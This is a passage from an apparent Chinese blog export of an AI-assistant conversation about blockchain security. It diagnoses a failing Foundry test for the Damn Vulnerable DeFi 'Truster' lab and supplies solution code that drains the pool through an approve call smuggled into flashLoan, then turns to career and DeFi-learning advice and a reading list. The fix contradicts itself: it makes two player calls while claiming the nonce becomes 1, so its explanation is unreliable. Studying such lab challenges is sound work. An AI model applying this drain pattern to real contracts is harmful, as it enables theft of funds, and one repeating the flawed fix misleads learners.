class="hljs-number">1</span><br></code></pre></div></td></tr></table></figure>
<ul>
<li>逐行拆解：<ol>
<li>执行 <code>test_truster()</code> 测试函数，总耗 gas 6768；</li>
<li>调用 <code>VM::startPrank(player)</code>：模拟以 <code>player</code>（攻击者）身份执行交易；</li>
<li>调用 <code>VM::stopPrank()</code>：结束模拟身份；</li>
<li>调用 <code>VM::getNonce(player)</code>：获取 <code>player</code> 地址的交易次数（nonce，以太坊中每笔交易对应一个 nonce，初始为 0，每发一笔交易 +1），返回结果是 0；</li>
<li>调用 <code>VM::assertEq(0, 1, ...)</code>：测试用例要求验证“player 的交易次数是 1”，但实际是 0，触发断言失败，交易回滚；</li>
<li>最终因断言失败，整个测试用例回滚。</li>
</ol>
</li>
</ul>
<h4 id="5-汇总结果"><a href="#5-汇总结果" class="headerlink" title="5. 汇总结果"></a>5. 汇总结果</h4><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">Suite</span> result: FAILED. <span class="hljs-number">1</span> passed; <span class="hljs-number">1</span> failed; <span class="hljs-number">0</span> skipped; finished in <span class="hljs-number">12</span>.<span class="hljs-number">62</span>ms<br><span class="hljs-attribute">Ran</span> <span class="hljs-number">1</span> test suite in <span class="hljs-number">26</span>.<span class="hljs-number">41</span>ms: <span class="hljs-number">1</span> tests passed, <span class="hljs-number">1</span> failed, <span class="hljs-number">0</span> skipped (<span class="hljs-number">2</span> total tests)<br><span class="hljs-attribute">Failing</span> tests:<span class="hljs-meta"></span><br><span class="hljs-meta">[FAIL: Player executed more than one tx: 0 != 1] test_truster() (gas: 6768)</span><br></code></pre></div></td></tr></table></figure>
<ul>
<li>核心：测试套件整体失败，仅 <code>test_assertInitialState()</code> 通过，<code>test_truster()</code> 失败，无跳过的用例。</li>
</ul>
<h3 id="二、失败原因分析"><a href="#二、失败原因分析" class="headerlink" title="二、失败原因分析"></a>二、失败原因分析</h3><p>这个失败是 <strong>测试用例的断言逻辑</strong> 导致的，而非合约代码本身的漏洞，核心原因：</p>
<ol>
<li><code>test_truster()</code> 测试用例中，编写者预期“攻击者（player）需要执行至少 1 笔交易”（所以断言 <code>nonce == 1</code>）；</li>
<li>但实际执行中，攻击者地址的 <code>nonce</code> 是 0（说明没有发送任何交易）；</li>
<li>断言 <code>assertEq(0, 1)</code> 不成立，测试直接失败。</li>
</ol>
<h4 id="为什么攻击者没发交易？"><a href="#为什么攻击者没发交易？" class="headerlink" title="为什么攻击者没发交易？"></a>为什么攻击者没发交易？</h4><p>结合 damn-vulnerable-defi 的 Truster 挑战规则，这个测试用例的逻辑应该是：</p>
<ul>
<li>预期你编写攻击代码，让 <code>player</code> 发送 1 笔交易（调用 <code>flashLoan</code> 并完成攻击）；</li>
<li>但你的测试代码中，<code>test_truster()</code> 函数里<strong>没有实际执行攻击者的交易逻辑</strong>（比如没调用 <code>pool.flashLoan()</code>），只是启动/停止了 <code>prank</code>，所以 <code>nonce</code> 还是 0。</li>
</ul>
<h3 id="三、如何修复这个测试失败？"><a href="#三、如何修复这个测试失败？" class="headerlink" title="三、如何修复这个测试失败？"></a>三、如何修复这个测试失败？</h3><p>以 damn-vulnerable-defi 的 Truster 挑战为例，你需要在 <code>test_truster()</code> 中补充攻击者的交易逻辑，示例如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs solidity">function test_truster() public &#123;<br>    // ========== 补充攻击者的交易逻辑 ==========<br>    vm.startPrank(player); // 模拟攻击者身份<br>    // 1. 构造攻击的 calldata（授权攻击者转走代币）<br>    bytes memory approveCalldata = abi.encodeWithSelector(<br>        dvt.approve.selector,<br>        player,<br>        type(uint256).max<br>    );<br>    // 2. 调用 flashLoan（这是攻击者的第1笔交易，nonce 会变成 1）<br>    pool.flashLoan(0, player, address(dvt), approveCalldata);<br>    // 3. 转走所有代币（可选，不影响 nonce 计数）<br>    dvt.transferFrom(address(pool), player, dvt.balanceOf(address(pool)));<br>    vm.stopPrank();<br><br>    // ========== 原有的断言逻辑 ==========<br>    uint256 playerNonce = vm.getNonce(player);<br>    assertEq(playerNonce, 1, &quot;Player executed more than one tx&quot;);<br><br>    // 额外验证：攻击者盗取了所有代币（可选）<br>    assertEq(dvt.balanceOf(player), TOKEN_INITIAL_SUPPLY);<br>    assertEq(dvt.balanceOf(address(pool)), 0);<br>&#125;<br></code></pre></div></td></tr></table></figure>
<ul>
<li>核心修改：在 <code>startPrank</code> 和 <code>stopPrank</code> 之间，补充攻击者调用合约的交易逻辑（调用 <code>flashLoan</code>），这样 <code>player</code> 的 <code>nonce</code> 会变成 1，断言就会通过。</li>
</ul>
<h3 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h3><ol>
<li>本次测试失败<strong>不是合约漏洞</strong>，而是 <code>test_truster()</code> 中<strong>缺少攻击者的交易执行逻辑</strong>，导致断言 <code>nonce == 1</code> 不成立；</li>
<li>关键信息：<ul>
<li><code>[PASS] test_assertInitialState()</code>：初始状态验证正常，合约部署、代币转账等前置逻辑没问题；</li>
<li><code>[FAIL] test_truster()</code>：断言失败，因为攻击者未发送任何交易（nonce=0≠1）；</li>
</ul>
</li>
<li>修复方向：在 <code>test_truster()</code> 中补充攻击者调用 <code>flashLoan</code> 的交易代码，让 <code>player</code> 的 <code>nonce</code> 变为 1，满足断言要求。</li>
</ol>
<p>简单来说，这个失败是“测试代码没写全”导致的，不是合约本身的问题，补充攻击交易逻辑后就能通过测试。</p>
<h1 id="想要做安全审计或者区块链安全研究员的难点是什么？"><a href="#想要做安全审计或者区块链安全研究员的难点是什么？" class="headerlink" title="想要做安全审计或者区块链安全研究员的难点是什么？"></a>想要做安全审计或者区块链安全研究员的难点是什么？</h1><p>要成为区块链安全审计师或安全研究员，难点不在于单一技术的掌握，而在于<strong>跨领域知识的深度融合、实战经验的积累，以及对抗性思维的养成</strong>。结合你的渗透测试背景和区块链学习路径，核心难点可以分为以下几个维度：</p>
<h3 id="一、技术栈的广度与深度双重挑战"><a href="#一、技术栈的广度与深度双重挑战" class="headerlink" title="一、技术栈的广度与深度双重挑战"></a>一、<strong>技术栈的广度与深度双重挑战</strong></h3><p>区块链安全不是单一技术领域，而是<strong>密码学、智能合约开发、底层协议、传统网络安全</strong>的交叉学科，每个分支都需要深入钻研：</p>
<ol>
<li><strong>智能合约层面的深度门槛</strong><ul>
<li>不仅要懂 Solidity 语法，更要理解 EVM 底层执行机制（比如 opcode 执行逻辑、存储布局 <code>slot</code>、<code>delegatecall</code>/<code>call</code>/<code>staticcall</code> 的权限差异）。很多漏洞（如重入、存储碰撞、函数选择器碰撞）都源于对 EVM 底层的理解不足。</li>
<li>要熟悉不同公链的合约特性：比如以太坊的 <code>CREATE2</code> 部署机制、BSC 的低 gas 限制导致的优化漏洞、Solana 的 Rust 合约内存安全问题（与 EVM 完全不同），跨链场景下的桥接协议漏洞（比如资产跨链的签名验证逻辑）。</li>
</ul>
</li>
<li><strong>传统安全与区块链安全的思维转换</strong><br>你的渗透测试经验是优势，但需要适配区块链的特殊性：<ul>
<li>传统渗透测试的“漏洞利用”是<strong>破坏系统可用性/保密性</strong>，而区块链安全的“漏洞利用”是<strong>直接盗取资产</strong>，攻击路径更短、后果更严重；</li>
<li>传统漏洞可以通过补丁修复，而智能合约<strong>一旦部署无法修改</strong>，审计时需要做到“零容错”，任何小疏忽都可能导致数百万美元损失；</li>
<li>传统安全的“权限控制”是基于账户/角色，而区块链的权限是基于<strong>合约代码逻辑</strong>（比如 <code>onlyOwner</code> 修饰符的滥用、未授权的函数调用）。</li>
</ul>
</li>
<li><strong>密码学与共识协议的底层理解</strong><br>研究员级别的岗位需要理解共识层漏洞（比如 PoW 的 51% 攻击、PoS 的长程攻击）、密码学原语的正确使用（比如 ECDSA 签名重放攻击、哈希函数碰撞风险）。<br>例如：很多合约因错误使用 <code>ecrecover</code> 导致签名被伪造，本质是对椭圆曲线签名算法的细节理解不到位。</li>
</ol>
<h3 id="二、实战经验的稀缺性与高门槛"><a href="#二、实战经验的稀缺性与高门槛" class="headerlink" title="二、实战经验的稀缺性与高门槛"></a>二、<strong>实战经验的稀缺性与高门槛</strong></h3><p>区块链安全是<strong>实践驱动</strong>的领域，书本知识无法替代实战经验，而实战机会的获取是核心难点：</p>
<ol>
<li><strong>真实漏洞场景的复杂性远超靶场</strong><ul>
<li>Damn Vulnerable DeFi 等靶场的漏洞是“孤立、简化”的，而真实项目的漏洞往往是<strong>多个缺陷的组合</strong>（比如“忽略返回值 + 权限失控 + 外部调用未校验”叠加导致的攻击）。</li>
<li>真实项目会引入大量第三方库（如 OpenZeppelin 版本兼容问题）、复杂业务逻辑（如 AMM 定价算法、借贷协议的清算机制），审计时需要穿透业务逻辑找漏洞，而不是只看代码语法。</li>
</ul>
</li>
<li><strong>漏洞挖掘的“对抗性思维”难以培养</strong><br>审计师需要站在<strong>攻击者视角</strong>思考问题，而不是“按部就班查漏洞清单”：<ul>
<li>比如 Truster 合约的漏洞，Slither 只能发现“忽略返回值”，但真正的攻击点是“允许借 0 代币 + 任意外部调用”的组合逻辑，这需要你跳出工具的局限，主动构造攻击路径。</li>
<li>高级漏洞（如闪电贷攻击、重入攻击的变种）需要理解业务流程，比如“如何利用闪电贷操纵代币价格，再触发清算机制获利”，这需要对 DeFi 业务的深度理解。</li>
</ul>
</li>
<li><strong>复现真实漏洞的成本高</strong><br>要积累经验，需要复现历史上的重大漏洞（如 The DAO 攻击、Poly Network 攻击、Axie Infinity 盗币事件），但这需要：<ul>
<li>还原当时的合约代码和网络状态；</li>
<li>理解攻击的完整链路（从漏洞发现到利用的每一步）；</li>
<li>分析漏洞的根本原因（是代码缺陷还是设计缺陷）。</li>
</ul>
</li>
</ol>
<h3 id="三、工具链的驾驭与定制能力"><a href="#三、工具链的驾驭与定制能力" class="headerlink" title="三、工具链的驾驭与定制能力"></a>三、<strong>工具链的驾驭与定制能力</strong></h3><p>成熟的审计师/研究员不能只依赖现成工具，而要具备<strong>工具定制和数据分析能力</strong>：</p>
<ol>
<li><strong>静态分析工具的局限性与优化</strong><br>Slither、Mythril 等工具只能发现<strong>已知漏洞</strong>，对于复杂的逻辑漏洞（如业务逻辑缺陷）无能为力。你需要：<ul>
<li>理解工具的检测原理（比如 Slither 如何通过数据流分析发现重入漏洞）；</li>
<li>定制检测规则（比如针对特定项目的业务逻辑，编写 Slither 插件）；</li>
<li>不迷信工具结果：工具告警的“高危漏洞”可能是误报，而真正的致命漏洞可能被工具忽略。</li>
</ul>
</li>
<li><strong>动态分析与形式化验证的门槛</strong><ul>
<li>动态分析（如 Echidna、Manticore）需要编写属性测试用例，验证合约是否满足“不变性”（比如“借贷协议的总储备金 = 所有用户存款之和”），这需要掌握形式化验证的思维；</li>
<li>形式化验证（如 Certora）是目前最高效的漏洞检测手段，但学习曲线极陡，需要掌握逻辑语言（如 Solidity 断言、TLAPS 语言）。</li>
</ul>
</li>
<li><strong>链上数据的分析能力</strong><br>研究员需要从链上数据中挖掘潜在攻击（比如异常交易、大额转账、合约调用模式），这需要掌握：<ul>
<li>链上数据查询工具（如 Etherscan API、Graph 协议）；</li>
<li>数据分析技能（Python + Pandas 处理交易数据，识别异常模式）。</li>
</ul>
</li>
</ol>
<h3 id="四、行业门槛与持续学习的压力"><a href="#四、行业门槛与持续学习的压力" class="headerlink" title="四、行业门槛与持续学习的压力"></a>四、<strong>行业门槛与持续学习的压力</strong></h3><ol>
<li><strong>行业的“信任背书”门槛</strong><br>区块链安全是<strong>结果导向</strong>的行业，初级审计师很难仅凭简历获得信任：<ul>
<li>大厂或审计机构更看重<strong>实战成果</strong>：比如在 Code4rena、Sherlock 等漏洞赏金平台的排名、提交的漏洞报告、参与过的审计项目；</li>
<li>初级岗位竞争激烈，很多团队要求候选人“自带案例”（比如独立发现某个合约的漏洞，并提交详细报告）。</li>
</ul>
</li>
<li><strong>技术迭代速度快，需要持续学习</strong><br>区块链技术的更新速度远超传统安全领域：<ul>
<li>新的公链（如 Aptos、Sui）采用全新的虚拟机（Move 语言），漏洞类型与 EVM 完全不同；</li>
<li>新的协议（如 zk-Rollup、账户抽象 ERC-4337）带来新的攻击面（比如 zk 证明的伪造风险、智能账户的权限管理漏洞）；</li>
<li>新的攻击手段（如 MEV 提取导致的前端攻击、跨链消息伪造）不断涌现，需要你保持对行业动态的敏感度。</li>
</ul>
</li>
<li><strong>合规与伦理的边界把握</strong><br>区块链安全涉及大量资产，需要明确<strong>合法合规的边界</strong>：<ul>
<li>漏洞挖掘必须遵循“负责任披露”原则，不能利用漏洞盗取资产；</li>
<li>参与漏洞赏金计划时，要严格遵守平台规则，避免触碰法律红线；</li>
<li>审计报告的撰写需要客观严谨，既不能遗漏高危漏洞，也不能夸大风险导致项目恐慌。</li>
</ul>
</li>
</ol>
<h3 id="五、从初级审计到研究员的进阶难点"><a href="#五、从初级审计到研究员的进阶难点" class="headerlink" title="五、从初级审计到研究员的进阶难点"></a>五、<strong>从初级审计到研究员的进阶难点</strong></h3><ul>
<li><strong>初级审计师</strong>：能使用工具发现常见漏洞，撰写基础审计报告；</li>
<li><strong>资深审计师</strong>：能穿透复杂业务逻辑，发现组合漏洞，提出修复方案；</li>
<li><strong>安全研究员</strong>：能<strong>预测新的漏洞类型</strong>，提出防御机制，甚至推动行业安全标准的制定。</li>
</ul>
<p>从初级到研究员的跨越，难点在于<strong>从“被动查漏洞”到“主动创造漏洞检测方法”</strong>，需要你具备科研能力（比如发表安全论文、提出新的攻击模型）。</p>
<h3 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a>总结</h3><p>对你而言，最大的优势是<strong>渗透测试的对抗性思维和漏洞挖掘经验</strong>，这是很多纯开发背景的审计师不具备的。你需要突破的难点是：</p>
<ol>
<li>补足 EVM 底层、DeFi 业务逻辑的知识；</li>
<li>通过靶场复现、漏洞赏金平台积累实战经验；</li>
<li>从“工具使用者”升级为“工具定制者”，提升漏洞挖掘的效率和深度。</li>
</ol>
<p>这个过程没有捷径，但你的技术背景已经为你铺平了一半的道路。</p>
<p>我可以帮你整理一份<strong>区块链安全研究员进阶路线图</strong>，涵盖从初级到资深的学习资源、实战平台和能力提升节点，需要吗？</p>
<h1 id="如何深入理解DeFi-业务"><a href="#如何深入理解DeFi-业务" class="headerlink" title="如何深入理解DeFi 业务"></a>如何深入理解DeFi 业务</h1><p>要深入理解 <strong>DeFi 业务逻辑</strong>，核心是<strong>从「协议本质」出发，拆解其核心机制、经济模型和风险点</strong>，而不是停留在“知道概念”的层面。结合区块链安全审计的视角（你需要理解业务才能发现逻辑漏洞），可以按照「<strong>基础认知 → 核心协议拆解 → 实战验证 → 风险建模</strong>」的路径逐步深入，以下是具体方法：</p>
<h3 id="一、先建立-DeFi-的底层认知框架"><a href="#一、先建立-DeFi-的底层认知框架" class="headerlink" title="一、先建立 DeFi 的底层认知框架"></a>一、先建立 DeFi 的底层认知框架</h3><p>DeFi 的本质是<strong>去中心化的金融基础设施</strong>，所有协议都是围绕「<strong>资产流转、价值定价、风险对冲</strong>」三大核心需求设计的。在学习任何 DeFi 协议前，先明确两个底层逻辑：</p>
<ol>
<li><strong>DeFi 的核心特征</strong><ul>
<li><strong>无许可性</strong>：任何人都能参与，无需开户/审核（这也是漏洞的温床，比如未授权调用）；</li>
<li><strong>可编程性</strong>：合约代码定义所有规则，没有人工干预（漏洞一旦存在，无法事后补救）；</li>
<li><strong>组合性（Composability）</strong>：协议之间可以自由组合（比如 Aave 借贷的资产可以存入 Curve 做流动性挖矿），这会导致<strong>风险传导</strong>（一个协议漏洞可能波及多个关联协议）。</li>
</ul>
</li>
<li><strong>DeFi 的核心资产与载体</strong><ul>
<li><strong>ERC20 代币</strong>：绝大多数 DeFi 资产的载体，理解 <code>transfer</code>/<code>approve</code>/<code>transferFrom</code> 的授权逻辑是基础；</li>
<li><strong>智能合约账户</strong>：用户通过钱包地址与协议交互，权限完全由代码控制；</li>
<li><strong>链上数据透明性</strong>：所有交易、持仓、资金流向都可在区块链浏览器（如 Etherscan）查询（这是审计和漏洞分析的关键）。</li>
</ul>
</li>
</ol>
<h3 id="二、拆解-DeFi-核心协议的业务逻辑（从简单到复杂）"><a href="#二、拆解-DeFi-核心协议的业务逻辑（从简单到复杂）" class="headerlink" title="二、拆解 DeFi 核心协议的业务逻辑（从简单到复杂）"></a>二、拆解 DeFi 核心协议的业务逻辑（从简单到复杂）</h3><p>DeFi 协议种类繁多，但核心只有几大类：<strong>借贷协议、DEX（去中心化交易所）、稳定币、流动性挖矿/收益聚合器</strong>。学习的关键是<strong>不记名词，而是拆解「钱怎么进、怎么赚、怎么出」</strong>。</p>
<h4 id="1-第一步：从「借贷协议」入手（最容易理解业务逻辑）"><a href="#1-第一步：从「借贷协议」入手（最容易理解业务逻辑）" class="headerlink" title="1. 第一步：从「借贷协议」入手（最容易理解业务逻辑）"></a>1. 第一步：从「借贷协议」入手（最容易理解业务逻辑）</h4><p>以 <strong>Aave/Compound</strong> 为例，这是 DeFi 的基础协议，核心是「存币生息、借币抵押」。</p>
<ul>
<li><strong>核心业务流程拆解</strong><ol>
<li><strong>存款端</strong>：用户存入 ERC20 代币 → 协议铸造对应数量的「计息凭证」（如 Aave 的 <code>aToken</code>）→ <code>aToken</code> 随时间累积利息（本质是协议将存款出借给借款人，收取利息后分给存款人）。</li>
<li><strong>借款端</strong>：用户抵押资产（抵押率通常 150%+）→ 借出其他资产 → 支付利息 → 归还借款+利息后赎回抵押品。</li>
<li><strong>清算机制</strong>：如果借款人的抵押品价值下跌（低于清算阈值），任何人都可以触发清算 → 以折扣价买入抵押品 → 偿还借款人的债务（这是借贷协议的核心风险点，很多漏洞出现在清算逻辑）。</li>
</ol>
</li>
<li><strong>安全审计视角的关键问题</strong><ul>
<li>抵押率计算是否准确？（比如是否实时更新价格，价格喂价是否被操纵）</li>
<li>清算逻辑是否有漏洞？（比如清算折扣是否可被利用，清算权限是否未授权）</li>
<li>计息凭证的铸造/销毁是否与资产余额严格对应？（比如是否存在超额铸造 <code>aToken</code> 的情况）</li>
</ul>
</li>
</ul>
<h4 id="2-第二步：深入-DEX-的核心机制（重点是「定价逻辑」）"><a href="#2-第二步：深入-DEX-的核心机制（重点是「定价逻辑」）" class="headerlink" title="2. 第二步：深入 DEX 的核心机制（重点是「定价逻辑」）"></a>2. 第二步：深入 DEX 的核心机制（重点是「定价逻辑」）</h4><p>DEX 分为两类：<strong>订单簿型（如 0x）</strong> 和 <strong>AMM（自动做市商，如 Uniswap/Curve）</strong>，AMM 是主流，核心是「用数学公式定价，替代传统交易所的买卖盘」。</p>
<ul>
<li><strong>Uniswap V2 核心业务拆解</strong><ul>
<li>核心公式：<code>x * y = k</code>（x 和 y 是交易对的两种代币数量，k 是常数）→ 代币价格由 <code>y/x</code> 决定，交易时 x 增加则 y 减少，价格自动变化。</li>
<li>流动性挖矿：用户存入两种代币做市 → 获得 LP 代币 → 赚取交易手续费 → 赎回 LP 代币时取回本金+手续费。</li>
</ul>
</li>
<li><strong>安全审计视角的关键问题</strong><ul>
<li>价格操纵风险：比如通过闪电贷注入大量代币，瞬间改变 <code>x/y</code> 的比例，操纵价格后套利（即「闪电贷攻击」的典型场景）；</li>
<li>LP 代币的铸造逻辑：是否严格按照存入资产的比例计算，是否存在漏洞导致超额铸造；</li>
<li>手续费分配是否公平：是否存在某类账户可以盗取手续费的情况。</li>
</ul>
</li>
</ul>
<h4 id="3-第三步：理解复杂协议的组合逻辑（如收益聚合器、跨链桥）"><a href="#3-第三步：理解复杂协议的组合逻辑（如收益聚合器、跨链桥）" class="headerlink" title="3. 第三步：理解复杂协议的组合逻辑（如收益聚合器、跨链桥）"></a>3. 第三步：理解复杂协议的组合逻辑（如收益聚合器、跨链桥）</h4><p>高阶 DeFi 协议（如 Yearn、MakerDAO、跨链桥）的核心是<strong>「协议的协议」</strong>，业务逻辑更复杂，但本质是对基础协议的组合和优化。</p>
<ul>
<li>以 <strong>Yearn</strong> 为例：用户存入代币 → Yearn 自动将资产分配到收益最高的借贷/挖矿协议（如 Aave、Curve）→ 赚取的收益再复投 → 最大化用户收益。<ul>
<li>审计关键：<strong>资产转移的权限控制</strong>（Yearn 合约是否有权限将用户资产转入其他协议？是否存在权限滥用）、<strong>收益计算逻辑</strong>（是否存在少算/多算收益的漏洞）。</li>
</ul>
</li>
<li>以 <strong>MakerDAO</strong> 为例：用户抵押 ETH → 铸造稳定币 DAI → DAI 与美元挂钩的核心是「抵押品价值 ≥ DAI 发行量 + 清算惩罚」。<ul>
<li>审计关键：<strong>抵押品定价机制</strong>（是否依赖中心化喂价？喂价是否可被操纵）、<strong>清算触发条件</strong>（是否存在恶意触发清算的漏洞）。</li>
</ul>
</li>
</ul>
<h3 id="三、实战验证：从「链上数据-合约代码」反向推导业务逻辑"><a href="#三、实战验证：从「链上数据-合约代码」反向推导业务逻辑" class="headerlink" title="三、实战验证：从「链上数据 + 合约代码」反向推导业务逻辑"></a>三、实战验证：从「链上数据 + 合约代码」反向推导业务逻辑</h3><p>理论学习后，必须通过<strong>实战拆解真实协议</strong>来深化理解，这是审计师的核心技能。具体步骤：</p>
<ol>
<li><strong>选一个简单协议，查链上数据</strong><ul>
<li>打开 Etherscan，搜索一个主流 DeFi 协议（如 Uniswap V2 工厂合约 <code>0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f</code>）；</li>
<li>查看「Contract → Read Contract」：调用 <code>getPair</code> 函数，输入两个代币地址（如 ETH/USDC），获取交易对合约地址；</li>
<li>查看交易对合约的「Holders」：看 LP 代币的持有者，理解流动性分布；</li>
<li>查看「Transactions」：找一笔 Swap 交易，分析交易的输入输出数据（<code>input</code> 字段），理解 <code>swap</code> 函数的参数和执行逻辑。</li>
</ul>
</li>
<li><strong>阅读合约代码，映射业务逻辑</strong><ul>
<li>找到协议的开源代码（如 Uniswap V2 在 GitHub 的仓库）；</li>
<li>把代码中的函数和链上业务对应起来：比如 <code>swap</code> 函数对应「用户兑换代币」的操作，<code>mint</code> 函数对应「用户添加流动性」的操作；</li>
<li>重点关注<strong>核心状态变量</strong>：比如 Uniswap V2 的 <code>reserve0</code>/<code>reserve1</code>（两种代币的储备量），这直接决定了定价公式 <code>x*y=k</code> 的执行。</li>
</ul>
</li>
<li><strong>用 Damn Vulnerable DeFi 复现业务漏洞</strong><ul>
<li>DVF 中的很多题目都是基于真实 DeFi 协议的简化版（比如 <code>Truster</code> 对应闪电贷协议，<code>Puppet</code> 对应 Uniswap 价格操纵）；</li>
<li>完成题目时，强制自己思考：<strong>这个漏洞是如何利用业务逻辑的？如果是真实协议，如何修复？</strong></li>
</ul>
</li>
</ol>
<h3 id="四、建立「业务风险建模」思维（审计师的核心能力）"><a href="#四、建立「业务风险建模」思维（审计师的核心能力）" class="headerlink" title="四、建立「业务风险建模」思维（审计师的核心能力）"></a>四、建立「业务风险建模」思维（审计师的核心能力）</h3><p>深入理解 DeFi 业务的最终目标，是<strong>从业务逻辑中识别潜在的攻击面</strong>，而不是单纯的技术漏洞。你需要学会：</p>
<ol>
<li><strong>识别「业务逻辑漏洞」的特征</strong><ul>
<li>技术漏洞：比如忽略返回值、重入攻击（Slither 等工具可发现）；</li>
<li>业务逻辑漏洞：比如「闪电贷 + 价格操纵 + 清算」的组合攻击（工具无法发现，必须理解业务才能识别）。<br>举个例子：某借贷协议允许用户用 LP 代币抵押借款，攻击者可以：<br>① 用闪电贷借入大量代币，添加流动性获得 LP 代币；<br>② 用 LP 代币抵押借出协议的平台币；<br>③ 卖出平台币，砸盘导致 LP 代币价值暴跌；<br>④ 触发清算，以极低价格赎回 LP 代币，归还闪电贷，赚取差价。<br>这个攻击的核心是<strong>利用「LP 代币抵押率过高 + 价格喂价延迟」的业务缺陷</strong>，而非单一技术漏洞。</li>
</ul>
</li>
<li><strong>总结不同协议的「高危攻击面」</strong><table>
<thead>
<tr>
<th>协议类型</th>
<th>核心业务</th>
<th>高危攻击面</th>
</tr>
</thead>
<tbody><tr>
<td>借贷协议</td>
<td>抵押借款 + 清算</td>
<td>价格操纵、清算逻辑漏洞、超额借款</td>
</tr>
<tr>
<td>AMM DEX</td>
<td>代币兑换 + LP 挖矿</td>
<td>闪电贷价格操纵、LP 代币铸造漏洞</td>
</tr>
<tr>
<td>稳定币</td>
<td>抵押铸造 + 锚定</td>
<td>喂价操纵、抵押品不足、清算失败</td>
</tr>
<tr>
<td>跨链桥</td>
<td>资产跨链转移</td>
<td>签名伪造、跨链消息篡改、权限失控</td>
</tr>
</tbody></table>
</li>
</ol>
<h3 id="五、持续跟进行业动态，理解业务创新"><a href="#五、持续跟进行业动态，理解业务创新" class="headerlink" title="五、持续跟进行业动态，理解业务创新"></a>五、持续跟进行业动态，理解业务创新</h3><p>DeFi 业务的迭代速度极快，新协议（如 LSD、ZK-Rollup 上的 DeFi）会不断带来新的业务逻辑和攻击面。你需要：</p>
<ul>
<li>关注行业媒体：<strong>DeFi Llama</strong>（看协议锁仓量排名）、<strong>Bankless</strong>（看深度分析）、<strong>慢雾科技</strong>（看漏洞分析报告）；</li>
<li>参与漏洞赏金平台：<strong>Code4rena</strong>、<strong>Sherlock</strong>，看真实审计项目的漏洞报告，学习别人如何从业务逻辑中发现漏洞；</li>
<li>跟踪新协议的机制：比如 LSD（流动性质押衍生品）的核心是「质押 ETH 获得 LSD 代币，同时继续挖矿」，其攻击面在于「质押资产的托管机制」和「LSD 代币的定价逻辑」。</li>
</ul>
<h3 id="总结-4"><a href="#总结-4" class="headerlink" title="总结"></a>总结</h3><p>深入理解 DeFi 业务的关键，是<strong>「从业务本质出发，用代码和链上数据验证，以风险建模收尾」</strong>。对你而言，结合渗透测试的对抗性思维，重点要关注「<strong>业务流程中的权限控制、资产流转的逻辑闭环、经济模型的数学稳定性</strong>」——这些才是 DeFi 审计的核心，也是工具无法替代的能力。</p>
<p>我可以帮你整理一份 <strong>DeFi 核心协议拆解清单</strong>，包含 Uniswap V2、Aave、MakerDAO 的关键合约地址、核心函数和审计重点，需要吗？</p>
<h1 id="深入理解DeFi-业务，有哪些书籍或者资料可以学习"><a href="#深入理解DeFi-业务，有哪些书籍或者资料可以学习" class="headerlink" title="深入理解DeFi 业务，有哪些书籍或者资料可以学习"></a>深入理解DeFi 业务，有哪些书籍或者资料可以学习</h1><p>深入理解DeFi业务，可选择体系化的书籍搭建知识框架，再借助权威线上文档、课程和行业报告补充实战与前沿内容。以下是分类型整理的优质学习资料，适配从入门到深入研究的不同需求：</p>
<h3 id="专业书籍"><a href="#专业书籍" class="headerlink" title="专业书籍"></a>专业书籍</h3><ol>
<li><strong>《DeFi——开放金融：理论、范式和实践》</strong><br> 这本书由经济学博士刘平等学者编写，内容覆盖极为全面，从分布式记账、去中心化网络等底层技术，到借贷、保险、交易所等DeFi核心应用场景均有涉及。它还专门分析了Uniswap、Compound等主流协议，同时探讨了DeFi的合规架构、治理结构和安全问题，适合想要系统掌握DeFi理论与实践结合的学习者，尤其适合作为深入研究的入门学术类读物。</li>
<li><strong>《DeFi与金融的未来》</strong><br> 作者包含坎贝尔·R·哈维等金融与DeFi领域专家，书籍分为7章，既剖析了传统金融体系的痛点以及DeFi的解决方案，也深入探讨了Uniswap、Compound等核心创新协议。它的优势在于打通了传统金融与DeFi的认知壁垒，适合有金融基础、想理解DeFi行业价值与未来趋势的读者。</li>
<li><strong>《How to DeFi》系列（含入门版与高级版）</strong><br> 这是CoinGecko团队编写的DeFi经典读物，入门版适合零基础用户快速了解DeFi基础应用，高级版则针对有基础的学习者，深入拆解DEX聚合器、去中心化衍生品、跨链桥等复杂模块，还分析了DeFi漏洞利用场景。其中文版可通过Gitbook在线阅读，内容贴合行业实操，能帮助读者快速对接真实DeFi业务场景。</li>
<li><strong>《DeFi for Dummies》</strong><br> 作为“傻瓜书”系列的一员，它以通俗易懂的语言梳理了DeFi的发展历程、核心应用和未来方向。书中涵盖资产管理、借贷、投资等DeFi关键领域，还介绍了在主流平台搭建基础DeFi应用的方法，适合传统金融从业者或新手快速入门，降低理解DeFi的门槛。</li>
</ol>
<h3 id="线上权威文档与报告"><a href="#线上权威文档与报告" class="headerlink" title="线上权威文档与报告"></a>线上权威文档与报告</h3><ol>
<li><strong>主流协议官方文档</strong><br> 深入DeFi业务的核心是理解头部协议的运作逻辑，这些官方文档是最权威的资料：<ul>
<li>Uniswap Docs：详细讲解AMM自动做市商机制、流动性池规则、手续费分配等核心业务，是理解DEX的关键资料；</li>
<li>Aave Docs：聚焦去中心化借贷的抵押机制、计息规则、清算流程等，可掌握DeFi借贷的核心业务逻辑；</li>
<li>MakerDAO Docs：围绕DAI稳定币的铸造、抵押品管理、去中心化治理等展开，能深入理解算法稳定币的业务原理。</li>
</ul>
</li>
<li><strong>行业报告与漏洞分析</strong><ul>
